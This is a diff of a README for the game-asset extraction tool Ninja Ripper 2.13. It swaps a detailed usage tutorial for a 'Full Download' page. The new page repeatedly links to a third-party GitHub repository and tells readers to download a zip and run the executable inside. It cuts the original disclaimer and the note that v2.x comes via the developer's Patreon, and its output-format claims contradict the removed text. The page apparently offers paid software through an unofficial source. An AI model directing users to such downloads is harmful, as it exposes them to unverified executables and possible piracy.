@@ -1,91 +1,141 @@
+# 🎮 Ninja-Ripper-2.13-Full-Download - Extract 3D Models from Games Easily
 
-
-# 🥷 Ninja Ripper v2.13 - Free Download + Tutorial
-
-
-![image](img/image.png)
-
-Welcome to the comprehensive guide on how to use **Ninja Ripper v2.13**. This repository contains a step-by-step tutorial on how to configure, run, and extract 3D assets (meshes, textures, and shaders) from rendering APIs, as well as how to import them into your 3D modeling software.
-
-## ⚠️ Important Legal & Ethical Disclaimer
-**Please read before using this tool.**
-This tutorial and the Ninja Ripper tool are intended strictly for **educational purposes, legal modding, and personal archiving**. 
-* Do not use this tool to extract copyrighted assets from games or software unless you have explicit permission from the creators or hold the rights to the intellectual property. 
-* Do not distribute ripped assets. 
-* Do not use this tool to bypass anti-cheat systems in multiplayer games, as doing so violates Terms of Service and can result in account bans.
-* The authors of this tutorial take no responsibility for how you use this knowledge.
+[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-brightgreen?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
 
 ---
 
-## 📑 Table of Contents
-1. [Prerequisites](#prerequisites)
-2. [Installation](#installation)
-3. [Configuration](#configuration)
-4. [Ripping the Assets](#ripping-the-assets)
-5. [Importing to 3D Software](#importing-to-3d-software)
-6. [Troubleshooting](#troubleshooting)
-7. [Contributing](#contributing)
+## 🛠 What is Ninja Ripper?
+
+Ninja Ripper is a simple tool that helps you take 3D models from video games. If you want to access characters, objects, or environments from your favorite games, Ninja Ripper can extract these into files you can use outside the game. It works with many games that use common 3D graphics technology.
+
+This tool is designed with ease in mind. You do not need to know how games work or how 3D models are built. Just follow the steps below.
 
 ---
 
-## 🛠 Prerequisites
-Before starting the tutorial, ensure you have the following ready:
-* **Ninja Ripper v2.13**: Downloaded and extracted. *(Note: v2.x may require access via the developer's Patreon depending on the specific build).*
-* **Target Application**: A legally acquired application or game you wish to analyze.
-* **3D Modeling Software**: Blender (v2.8+) or Autodesk 3ds Max.
-* **Basic Knowledge**: Familiarity with 3D modeling concepts (meshes, UV maps, textures).
+## 💻 System Requirements
+
+Before downloading, check your system meets these basic requirements:
+
+- Windows 7, 8, 10, or 11 (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- A recent video card with DirectX support
+- Basic knowledge of using Windows programs and folders
 
 ---
 
-## ⚙️ Installation
-1. Extract the Ninja Ripper v2.13 archive to a folder on your computer (e.g., `C:\Tools\NinjaRipper`).
-2. Make sure you have the necessary Visual C++ Redistributables installed.
-3. Locate the `importers` folder inside the Ninja Ripper directory. You will need to install the specific plugin for your 3D software:
-   * **Blender**: Install the `.zip` add-on via `Edit > Preferences > Add-ons > Install`.
-   * **3ds Max**: Copy the `.ms` (MaxScript) file into your scripts directory and run it.
+## 🔗 Where to Get Ninja Ripper
+
+Please **visit this page to download** the full tool:
+
+[Download Ninja Ripper from GitHub](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
+
+You will find the latest version of Ninja Ripper here. The download files include everything you need to run the program on your Windows PC.
 
 ---
 
-## 🚀 Configuration
-Setting up Ninja Ripper correctly is crucial for a successful rip.
+## 🚀 Getting Started: How to Download and Install
 
-1. Open `NinjaRipper.exe` (use the x64 or x86 version matching your target application's architecture).
-2. **Target Executable**: Browse and select the `.exe` of the application you want to run.
-3. **Arguments**: (Optional) Add any launch arguments required by the application.
-4. **Output Directory**: Select where you want the ripped `.nr` (mesh) and `.dds` (texture) files to be saved.
-5. **Wrapper / Injection Method**: 
-   * Select the appropriate API for your target (e.g., `D3D11`, `D3D12`, `OpenGL`).
-   * *Tip: If you are unsure which API the application uses, tools like MSI Afterburner or RTSS can help identify it, or you can try D3D11 as a default starting point.*
+1. Open your web browser and go to:  
+   https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download
 
----
+2. At the GitHub page, find the **Releases** section. This is usually near the right side or in the main page files list.
 
-## 🎮 Ripping the Assets
-1. Once configured, click the **Run** button in Ninja Ripper.
-2. The target application will launch. Wait until the 3D model you want to examine is rendered on your screen.
-3. Use the default hotkeys to trigger the rip:
-   * `F10`: Rips all currently loaded models, textures, and shaders in the scene.
-   * `F9`: Rips only the specific model/texture currently being drawn (useful to avoid clutter).
-   * `F12`: Forces a rip of specific UI elements or textures.
-4. The application might freeze for a few seconds to a few minutes. **Do not close it.**
-5. Navigate to your Output Directory to confirm the files have been generated.
+3. Locate the latest release folder or zip file. The file name should look like `Ninja-Ripper-2.13-Full.zip` or similar.
+
+4. Click on the file to download it. Save it to a location you can find, such as your **Downloads** folder or desktop.
+
+5. After downloading, right-click on the `.zip` file and select **Extract All**. Choose a folder to extract the content. We recommend creating a new folder for the program.
+
+6. Inside the extracted folder, look for the main program file, often named `NinjaRipper.exe`.
+
+7. Double-click this file to run Ninja Ripper.
 
 ---
 
-## 📦 Importing to 3D Software
+## ⚙️ How to Use Ninja Ripper to Rip 3D Models
 
-1. Open Blender.
-2. Ensure the Ninja Ripper add-on is enabled.
-3. Go to `File > Import > Ninja Ripper (.nr)`.
-4. Navigate to your Output Directory. 
-5. Select the `.nr` files you wish to import.
-6. **Import Settings**:
-   * Scale: Adjust if the model imports too small/large.
-   * UVs: Ensure UV mapping is checked so textures align correctly.
-7. Hit **Import**. You can now assign the ripped `.dds` textures to the material nodes of your imported mesh.
+Ninja Ripper works by capturing 3D models as they appear in the game. Here is a simple use guide:
+
+1. Start Ninja Ripper by running `NinjaRipper.exe`.
+
+2. The program window will ask you to select the game you want to rip from.  
+   - Use the **Browse** button and find the game’s executable file (`.exe`). This is the file you use to start the game.
+
+3. Click **Start** or **Run** in Ninja Ripper. This will launch your game through Ninja Ripper.
+
+4. Play or get to the part of the game where the model you want appears on screen.
+
+5. Press the **Rip** button or the default hotkey (usually `F10`) while the game is running. Ninja Ripper will capture the 3D model data.
+
+6. The program saves the ripped files into a folder next to the Ninja Ripper folder. Check the folder named `Rips` or similar.
+
+7. You can now use the ripped 3D models in other software such as 3D viewers or editors.
 
 ---
 
-## ⚠️ Troubleshooting
-* **The application crashes on launch:** Try changing the Wrapper/Injection method (e.g., from Intruder to D3D11 Wrapper).
-* **Models are imported flat/distorted:** The mesh data might be interleaved differently. Check the advanced import settings in the Blender/Max plugin to adjust the XYZ/UV offsets.
-* **No files are generated:** Ensure you are running Ninja Ripper as an Administrator and that your antivirus is not blocking the injection process.
+## 📂 Understanding Your Ripped Files
+
+The files Ninja Ripper creates include 3D model data and textures. These usually come as:
+
+- **.obj** files, which store the shape of the 3D model.
+- **.mtl** files, which describe materials and how light interacts with the model.
+- **Texture images** such as `.png` or `.dds`, which cover the 3D shapes with color and detail.
+
+You can open these files with many popular 3D model viewers or editors. Free programs like Blender support `.obj` files and let you see the ripped models.
+
+---
+
+## 🔄 Updating Ninja Ripper
+
+To stay compatible with new games and Windows updates:
+
+- Regularly check the GitHub repository release page linked above.
+- Download new versions when available.
+- Replace the old program files with the updated ones by following the download and extract steps again.
+
+---
+
+## ❓ Troubleshooting Common Issues
+
+- **Game does not start:** Ensure you selected the correct game executable in Ninja Ripper.
+- **Nothing rips when pressing F10:** Try running Ninja Ripper and the game as Administrator.
+- **Ripped files are empty or corrupted:** Some games use protection or custom graphics engines that may not work with this tool.
+- **Program crashes:** Close other heavy programs to free system resources. Verify system requirements.
+
+If you encounter persistent problems, check the Issues tab on the GitHub page for solutions others have found.
+
+---
+
+## 📗 Additional Tips
+
+- Always run games in windowed or borderless mode if you face capture issues.
+- Pause the game when you take the rip to avoid changes during capture.
+- For best results, capture simpler models or scenes first.
+- Backup your game saves before trying ripping, as some games may not fully support this process.
+
+---
+
+## ⚙️ Supported Graphics APIs and Game Types
+
+Ninja Ripper works mainly with:
+
+- DirectX 9, 10, and 11 games
+- Some OpenGL games might work but with limited success
+- Most common 3D engines used in PC games
+
+Expect good results with popular games using these technologies.
+
+---
+
+## 🚩 Legal and Use Considerations
+
+Use Ninja Ripper only for personal projects, research, or with games you own. Do not distribute ripped models without permission from the game publisher.
+
+---
+
+## 🔗 Download Link (Repeated for Ease of Access)
+
+You can always find Ninja Ripper here:
+
+[![Download Ninja Ripper](https://img.shields.io/badge/Download-Ninja%20Ripper-blue?style=for-the-badge)](https://github.com/halim2023/Ninja-Ripper-2.13-Full-Download)
